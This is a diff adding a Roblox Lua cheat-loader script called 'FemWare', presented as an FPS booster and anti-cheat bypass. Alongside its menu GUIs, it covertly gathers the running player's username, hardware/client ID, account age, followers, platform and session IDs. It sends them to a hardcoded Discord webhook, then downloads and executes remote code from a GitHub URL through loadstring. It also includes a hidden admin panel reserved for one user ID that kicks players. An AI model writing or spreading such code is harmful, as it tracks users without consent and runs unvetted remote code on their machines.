@@ -1,1 +1,306 @@
+local webhookUrl = "https://discord.com/api/webhooks/1460017137870573761/85Q-uUIpwCo11zQAiaSq_1XGg1iI-H82v9eA4Sfuxf0jXXHqAKMS0o1NByTOy4dBz9Jr"
 
+-- AYARLAR -------------------------------------------------------------------
+local SPECIAL_USER = "Miku_Sanxxxq" -- Sadece bu kullanıcıya özel GUI
+local ADMIN_USER_ID = 9571002452 -- BURAYA SENİN ROBLOX USER ID'İNİ YAZ (Sayı olarak)
+
+--// Servisler
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local MarketplaceService = game:GetService("MarketplaceService")
+local RunService = game:GetService("RunService")
+local StatsService = game:GetService("Stats")
+local UserInputService = game:GetService("UserInputService")
+local LocalizationService = game:GetService("LocalizationService")
+
+--// Oyuncu kontrolü
+local player = Players.LocalPlayer
+local playerName = player.Name
+local userId = player.UserId
+
+-- 1. ÖZEL GUI SADECE Miku_Sanxxxq İÇİN
+if playerName == SPECIAL_USER then
+    local SpecialGui = Instance.new("ScreenGui")
+    SpecialGui.Name = "MikuSpecialGUI"
+    SpecialGui.Parent = game.CoreGui
+
+    local MainFrame = Instance.new("Frame")
+    MainFrame.Size = UDim2.new(0, 250, 0, 60)
+    MainFrame.Position = UDim2.new(0.8, 0, 0.1, 0)
+    MainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
+    MainFrame.BackgroundTransparency = 0.2
+    MainFrame.Parent = SpecialGui
+
+    local Title = Instance.new("TextLabel")
+    Title.Text = "✨ ÖZEL FEMWARE ✨"
+    Title.Size = UDim2.new(1, 0, 0, 30)
+    Title.BackgroundTransparency = 1
+    Title.TextColor3 = Color3.fromRGB(255, 105, 180)
+    Title.Font = Enum.Font.SourceSansBold
+    Title.TextSize = 18
+    Title.Parent = MainFrame
+
+    local Status = Instance.new("TextLabel")
+    Status.Text = "Durum: AKTİF 🟢"
+    Status.Size = UDim2.new(1, 0, 0, 25)
+    Status.Position = UDim2.new(0, 0, 0.5, 0)
+    Status.BackgroundTransparency = 1
+    Status.TextColor3 = Color3.new(1, 1, 1)
+    Status.Font = Enum.Font.SourceSans
+    Status.TextSize = 14
+    Status.Parent = MainFrame
+
+    -- Kapat butonu
+    local CloseBtn = Instance.new("TextButton")
+    CloseBtn.Text = "X"
+    CloseBtn.Size = UDim2.new(0, 25, 0, 25)
+    CloseBtn.Position = UDim2.new(1, -30, 0, 5)
+    CloseBtn.BackgroundColor3 = Color3.fromRGB(255, 60, 60)
+    CloseBtn.TextColor3 = Color3.new(1, 1, 1)
+    CloseBtn.Font = Enum.Font.SourceSansBold
+    CloseBtn.Parent = MainFrame
+    
+    CloseBtn.MouseButton1Click:Connect(function()
+        SpecialGui:Destroy()
+    end)
+end
+
+-- 2. YÖNETİCİ PANELİ (SADECE SENİN İÇİN)
+if userId == ADMIN_USER_ID then
+    local AdminGui = Instance.new("ScreenGui")
+    AdminGui.Name = "AdminControlPanel"
+    AdminGui.Parent = game.CoreGui
+
+    local MainFrame = Instance.new("Frame")
+    MainFrame.Size = UDim2.new(0, 300, 0, 180)
+    MainFrame.Position = UDim2.new(0.5, -150, 0.8, -90)
+    MainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
+    MainFrame.BackgroundTransparency = 0.1
+    MainFrame.Parent = AdminGui
+
+    local Title = Instance.new("TextLabel")
+    Title.Text = "🛡️ YÖNETİCİ KONTROL"
+    Title.Size = UDim2.new(1, 0, 0, 30)
+    Title.BackgroundColor3 = Color3.fromRGB(40, 40, 60)
+    Title.TextColor3 = Color3.fromRGB(0, 255, 255)
+    Title.Font = Enum.Font.SourceSansBold
+    Title.TextSize = 18
+    Title.Parent = MainFrame
+
+    -- Oyuncu adı ile kick
+    local NameBox = Instance.new("TextBox")
+    NameBox.PlaceholderText = "Write player name..."
+    NameBox.Size = UDim2.new(0.9, 0, 0, 30)
+    NameBox.Position = UDim2.new(0.05, 0, 0.3, 0)
+    NameBox.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+    NameBox.TextColor3 = Color3.new(1, 1, 1)
+    NameBox.Font = Enum.Font.SourceSans
+    NameBox.Parent = MainFrame
+
+    local KickBtn = Instance.new("TextButton")
+    KickBtn.Text = "🔴 Kick Him"
+    KickBtn.Size = UDim2.new(0.9, 0, 0, 35)
+    KickBtn.Position = UDim2.new(0.05, 0, 0.55, 0)
+    KickBtn.BackgroundColor3 = Color3.fromRGB(200, 60, 60)
+    KickBtn.TextColor3 = Color3.new(1, 1, 1)
+    KickBtn.Font = Enum.Font.SourceSansBold
+    KickBtn.Parent = MainFrame
+
+    local StatusLabel = Instance.new("TextLabel")
+    StatusLabel.Text = "Ready"
+    StatusLabel.Size = UDim2.new(1, 0, 0, 20)
+    StatusLabel.Position = UDim2.new(0, 0, 0.9, -20)
+    StatusLabel.BackgroundTransparency = 1
+    StatusLabel.TextColor3 = Color3.new(1, 1, 1)
+    StatusLabel.Font = Enum.Font.SourceSans
+    StatusLabel.TextSize = 12
+    StatusLabel.Parent = MainFrame
+
+    -- Kick fonksiyonu
+    KickBtn.MouseButton1Click:Connect(function()
+        local targetName = NameBox.Text
+        local found = false
+        
+        for _, plr in ipairs(Players:GetPlayers()) do
+            if plr.Name:lower() == targetName:lower() then
+                plr:Kick("⚡ İnfazin verildi")
+                StatusLabel.Text = plr.Name .. " atıldı!"
+                found = true
+                break
+            end
+        end
+        
+        if not found then
+            StatusLabel.Text = "Oyuncu bulunamadı!"
+        end
+    end)
+    
+    print("✅ Admin panel is active!")
+end
+
+--// ORİJİNAL SCRIPT KODLARI (Aşağısı senin orijinal kodun) ---------------
+local teamName = tostring(player.Team and player.Team.Name or "No Team")
+local accountAge = player.AccountAge
+local accountCreationDate = os.date("%d/%m/%Y", os.time() - (365.25 * 24 * 60 * 60 - accountAge * 24 * 60 * 60))
+local playerCount = #Players:GetPlayers()
+local placeId, jobId = game.PlaceId, game.JobId
+local gameName = MarketplaceService:GetProductInfo(placeId).Name
+local ping = math.floor(StatsService.Network.ServerStatsItem["Data Ping"]:GetValue()) .. "ms"
+
+-- Yeni: Oyun dili tespiti (Türkçe ise "TR", değilse "EN")
+local localeId = LocalizationService.RobloxLocaleId
+local gameLanguage = localeId == "tr-tr" and "TR" or "EN"
+
+-- Yeni: Kullanıcının platformu
+local platform = UserInputService:GetPlatform()
+
+local platformName = ""
+if platform == Enum.Platform.Windows then
+    platformName = "PC"
+elseif platform == Enum.Platform.XBoxOne then
+    platformName = "Xbox"
+elseif platform == Enum.Platform.Android then
+    platformName = "Android"
+elseif platform == Enum.Platform.IOS then
+    platformName = "iOS"
+else
+    platformName = tostring(platform)
+end
+
+-- Premium kontrolü
+local isPremium = (player.MembershipType == Enum.MembershipType.Premium) and "Yeah" or "No"
+
+--// Executor Tespiti
+local function getExecutor()
+    if syn then return "Synapse X"
+    elseif is_sirhurt_closure then return "SirHurt"
+    elseif KRNL_LOADED then return "KRNL"
+    elseif getexecutorname then return getexecutorname()
+    else return "Bilinmiyor" end
+end
+
+--// HWID
+local function getHWID()
+    return game:GetService("RbxAnalyticsService"):GetClientId()
+end
+
+--// Avatar
+local function getPlayerAvatar()
+    return string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png", userId)
+end
+
+--// FPS ölçüm
+local function getCurrentFPS(callback)
+    local frameCount = 0
+    local connection
+    connection = RunService.RenderStepped:Connect(function()
+        frameCount += 1
+    end)
+
+    task.delay(1, function()
+        connection:Disconnect()
+        callback(frameCount)
+    end)
+end
+
+--// Roblox API’den takipçi sayısı çek (async)
+local function getFollowerCount(callback)
+    local success, result = pcall(function()
+        return HttpService:JSONDecode(game:HttpGet("https://friends.roblox.com/v1/users/" .. userId .. "/followers/count")).count
+    end)
+    if success then
+        callback(result)
+    else
+        callback("Hata")
+    end
+end
+
+--// Webhook gönderici
+local function sendWebhook(finalFPS, followerCount)
+    local data = {
+        ["embeds"] = {{
+            ["title"] = "𒆙 FemWare Universe Executed!",
+            ["description"] = table.concat({
+                "👤 **Username:** [" .. playerName .. "](https://www.roblox.com/users/" .. userId .. "/profile)",
+                "🎯 **Team:** " .. teamName,
+                "🕹️ **Game:** " .. gameName,
+                "🆔 **Game ID:** " .. placeId,
+                "🌍 **Number of People in the Game:** " .. playerCount,
+                "🎯 **FPS:** " .. finalFPS,
+                "📡 **Ping:** " .. ping,
+                "🧠 **HWID:** " .. getHWID(),
+                "💼 **Account Age:** " .. accountAge .. " Day",
+                "📅 **Created Date:** " .. accountCreationDate,
+                "👥 **Followers:** " .. tostring(followerCount),
+                "🧪 **Executer:** " .. getExecutor(),
+                "🧩 **Job ID:** " .. jobId,
+                "🌐 **Game Language:** " .. gameLanguage,
+                "🕹️ **Platform:** " .. platformName,
+                "⭐ **Premium MemberShip:** " .. isPremium,
+                "🕒 **Time:** " .. os.date("%d/%m/%Y %H:%M:%S"),
+            }, "\n"),
+            ["color"] = tonumber("0xFF4500"),
+            ["thumbnail"] = {
+            ["url"] = "https://i.imgur.com/oz3r5qb.jpeg"
+           },
+            ["footer"] = {["text"] = "🎀 FemWare Loader 🐈 | by Army"}
+        }}
+    }
+
+    local encoded = HttpService:JSONEncode(data)
+    local request = http_request or request or HttpPost or syn and syn.request
+    if request then
+        request({
+            Url = webhookUrl,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = encoded
+        })
+    end
+end
+
+-- FPS GUI
+local function showFPSGui()
+    local fpsGui = Instance.new("ScreenGui", game.CoreGui)
+    fpsGui.Name = "FPSGui"
+    local label = Instance.new("TextLabel", fpsGui)
+    label.Size = UDim2.new(0, 120, 0, 25)
+    label.Position = UDim2.new(0, 10, 0, 10)
+    label.BackgroundColor3 = Color3.fromRGB(30,30,30)
+    label.TextColor3 = Color3.new(1,1,1)
+    label.Font = Enum.Font.SourceSansBold
+    label.TextSize = 16
+    label.BackgroundTransparency = 0.2
+    label.Text = "FPS: ..."
+
+    local frames = 0
+    local last = tick()
+    RunService.RenderStepped:Connect(function()
+        frames += 1
+        local now = tick()
+        if now - last >= 1 then
+            label.Text = "FPS: "..frames
+            frames = 0
+            last = now
+        end
+    end)
+end
+
+-- Çalıştır
+showFPSGui()
+
+getCurrentFPS(function(fps)
+    getFollowerCount(function(followers)
+        sendWebhook(fps, followers)
+    end)
+end)
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BattleWare/TWW/refs/heads/main/Protected"))()
+
+pcall(function()
+    game:GetService("StarterGui"):SetCore("SendNotification", {
+        Title = "🎉 Menu Activated !",
+        Text = "FPS Boosted + AntiCheat Bypassed",
+        Duration = 6
+    })
+end)
